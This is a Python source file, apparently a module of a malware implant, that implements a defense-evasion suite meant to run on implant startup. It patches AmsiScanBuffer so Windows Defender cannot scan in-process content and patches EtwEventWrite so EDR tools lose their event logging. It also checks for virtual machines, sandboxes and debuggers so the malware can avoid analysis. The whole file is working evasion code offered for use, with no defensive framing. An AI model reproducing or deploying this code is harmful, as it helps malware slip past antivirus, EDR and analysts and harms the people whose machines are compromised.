# evasion.py — Defense evasion techniques
#
# AMSI bypass, ETW patching, anti-VM detection, anti-debug checks.
# All implemented via ctypes — no external dependencies.
# Call run_evasion_suite() on implant startup.

import ctypes
import ctypes.wintypes
import os
import time
import struct
import winreg

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll


# ═══════════════════════════════════════════════════════════════
# AMSI Bypass — Patch AmsiScanBuffer
# ═══════════════════════════════════════════════════════════════

def bypass_amsi() -> dict:
    """Patch AmsiScanBuffer to return E_INVALIDARG, disabling AMSI scanning.

    This prevents Windows Defender from inspecting PowerShell commands
    and .NET assemblies loaded in-process.

    Returns:
        Dict with status and details.
    """
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        if not amsi:
            return {"status": "skip", "method": "amsi", "message": "amsi.dll not loaded"}

        # Find AmsiScanBuffer address
        amsi_scan_buf = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW("amsi.dll"),
            b"AmsiScanBuffer"
        )
        if not amsi_scan_buf:
            return {"status": "error", "method": "amsi", "message": "AmsiScanBuffer not found"}

        # Patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret
        # x64: B8 57 00 07 80 C3
        patch = b"\xB8\x57\x00\x07\x80\xC3"

        # Change memory protection to RWX
        old_protect = ctypes.wintypes.DWORD(0)
        ok = kernel32.VirtualProtect(
            ctypes.c_void_p(amsi_scan_buf),
            len(patch),
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect),
        )
        if not ok:
            return {"status": "error", "method": "amsi", "message": "VirtualProtect failed"}

        # Write the patch
        ctypes.memmove(ctypes.c_void_p(amsi_scan_buf), patch, len(patch))

        # Restore original protection
        kernel32.VirtualProtect(
            ctypes.c_void_p(amsi_scan_buf),
            len(patch),
            old_protect.value,
            ctypes.byref(old_protect),
        )

        return {"status": "ok", "method": "amsi", "message": "AmsiScanBuffer patched"}

    except Exception as e:
        return {"status": "error", "method": "amsi", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# ETW Patch — Neuter EtwEventWrite
# ═══════════════════════════════════════════════════════════════

def patch_etw() -> dict:
    """Patch EtwEventWrite to return immediately (RET), disabling ETW logging.

    Prevents .NET CLR and other providers from logging events
    that could be consumed by EDR solutions.

    Returns:
        Dict with status and details.
    """
    try:
        etw_addr = kernel32.GetProcAddress(
            kernel32.GetModuleHandleW("ntdll.dll"),
            b"EtwEventWrite"
        )
        if not etw_addr:
            return {"status": "error", "method": "etw", "message": "EtwEventWrite not found"}

        # Single RET instruction
        patch = b"\xC3"

        old_protect = ctypes.wintypes.DWORD(0)
        ok = kernel32.VirtualProtect(
            ctypes.c_void_p(etw_addr),
            len(patch),
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect),
        )
        if not ok:
            return {"status": "error", "method": "etw", "message": "VirtualProtect failed"}

        ctypes.memmove(ctypes.c_void_p(etw_addr), patch, len(patch))

        kernel32.VirtualProtect(
            ctypes.c_void_p(etw_addr),
            len(patch),
            old_protect.value,
            ctypes.byref(old_protect),
        )

        return {"status": "ok", "method": "etw", "message": "EtwEventWrite patched (RET)"}

    except Exception as e:
        return {"status": "error", "method": "etw", "message": str(e)}


# ═══════════════════════════════════════════════════════════════
# Anti-VM Detection
# ═══════════════════════════════════════════════════════════════

_VM_REGISTRY_KEYS = [
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters"),
    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmci"),
    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmhgfs"),
]

_VM_PROCESSES = [
    "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
    "VBoxService.exe", "VBoxTray.exe", "VGAuthService.exe",
    "qemu-ga.exe", "vmsrvc.exe", "vmusrvc.exe",
    "xenservice.exe",
]

_VM_MAC_PREFIXES = [
    "00:0c:29",  # VMware
    "00:50:56",  # VMware
    "08:00:27",  # VirtualBox
    "00:15:5d",  # Hyper-V
    "00:1c:14",  # VMware
    "52:54:00",  # QEMU/KVM
]


def detect_vm() -> dict:
    """Check multiple indicators for virtual machine environments.

    Returns:
        Dict with individual check results and overall is_vm boolean.
    """
    results = {
        "registry": _check_vm_registry(),
        "mac_address": _check_vm_mac(),
        "processes": _check_vm_processes(),
        "disk_size": _check_vm_disk(),
        "hostname": _check_vm_hostname(),
    }
    results["is_vm"] = any(results.values())
    return results


def _check_vm_registry() -> bool:
    """Check for VM-related registry keys."""
    for hive, path in _VM_REGISTRY_KEYS:
        try:
            key = winreg.OpenKey(hive, path)
            winreg.CloseKey(key)
            return True
        except (FileNotFoundError, OSError):
            continue
    return False


def _check_vm_mac() -> bool:
    """Check if MAC address matches known VM vendor prefixes."""
    import uuid
    node = uuid.getnode()
    mac = ":".join(f"{(node >> i) & 0xFF:02x}" for i in range(40, -1, -8))
    mac_lower = mac.lower()
    return any(mac_lower.startswith(prefix) for prefix in _VM_MAC_PREFIXES)


def _check_vm_processes() -> bool:
    """Check if known VM service processes are running."""
    import subprocess
    try:
        result = subprocess.run(
            ["tasklist", "/FO", "CSV", "/NH"],
            capture_output=True, text=True, timeout=10,
        )
        output_lower = result.stdout.lower()
        return any(proc.lower() in output_lower for proc in _VM_PROCESSES)
    except Exception:
        return False


def _check_vm_disk() -> bool:
    """Check if disk size is suspiciously small (< 60GB suggests VM)."""
    try:
        import shutil
        total, _, _ = shutil.disk_usage("C:\\")
        gb = total / (1024 ** 3)
        return gb < 60
    except Exception:
        return False


def _check_vm_hostname() -> bool:
    """Check hostname for common VM patterns."""
    hostname = os.environ.get("COMPUTERNAME", "").lower()
    vm_patterns = ["sandbox", "malware", "virus", "sample", "test", "analysis", "cuckoo"]
    return any(p in hostname for p in vm_patterns)


# ═══════════════════════════════════════════════════════════════
# Anti-Debug Detection
# ═══════════════════════════════════════════════════════════════

def detect_debugger() -> dict:
    """Run multiple anti-debugging checks.

    Returns:
        Dict with individual check results and overall is_debugged boolean.
    """
    results = {
        "is_debugger_present": _check_is_debugger_present(),
        "remote_debugger": _check_remote_debugger(),
        "debug_port": _check_debug_port(),
        "timing_check": _check_timing(),
    }
    results["is_debugged"] = any(results.values())
    return results


def _check_is_debugger_present() -> bool:
    """kernel32.IsDebuggerPresent() — basic PEB check."""
    try:
        return bool(kernel32.IsDebuggerPresent())
    except Exception:
        return False


def _check_remote_debugger() -> bool:
    """kernel32.CheckRemoteDebuggerPresent() — remote debugger check."""
    try:
        debugged = ctypes.wintypes.BOOL(False)
        handle = kernel32.GetCurrentProcess()
        kernel32.CheckRemoteDebuggerPresent(handle, ctypes.byref(debugged))
        return bool(debugged.value)
    except Exception:
        return False


def _check_debug_port() -> bool:
    """NtQueryInformationProcess with ProcessDebugPort (class 7)."""
    try:
        debug_port = ctypes.c_ulong(0)
        status = ntdll.NtQueryInformationProcess(
            kernel32.GetCurrentProcess(),
            7,  # ProcessDebugPort
            ctypes.byref(debug_port),
            ctypes.sizeof(debug_port),
            None,
        )
        return debug_port.value != 0
    except Exception:
        return False


def _check_timing() -> bool:
    """Timing-based anti-debug — large delays suggest single-stepping."""
    try:
        start = time.perf_counter_ns()
        # Do some trivial work
        _ = sum(range(10000))
        elapsed = time.perf_counter_ns() - start
        # Normal execution: < 5ms. Debug stepping: >> 5ms
        return elapsed > 50_000_000  # 50ms threshold
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════
# Evasion Suite Runner
# ═══════════════════════════════════════════════════════════════

def run_evasion_suite(
    amsi: bool = True,
    etw: bool = True,
    anti_vm: bool = True,
    anti_debug: bool = True,
) -> dict:
    """Run the full evasion suite on implant startup.

    Args:
        amsi: Patch AmsiScanBuffer.
        etw: Patch EtwEventWrite.
        anti_vm: Check for VM and return result (caller decides exit).
        anti_debug: Check for debuggers and return result.

    Returns:
        Dict with results from each enabled technique.
        Caller should check vm_detected/debug_detected and decide whether to exit.
    """
    results = {}

    if amsi:
        results["amsi"] = bypass_amsi()

    if etw:
        results["etw"] = patch_etw()

    if anti_vm:
        vm = detect_vm()
        results["anti_vm"] = vm
        results["vm_detected"] = vm.get("is_vm", False)

    if anti_debug:
        dbg = detect_debugger()
        results["anti_debug"] = dbg
        results["debug_detected"] = dbg.get("is_debugged", False)

    return results
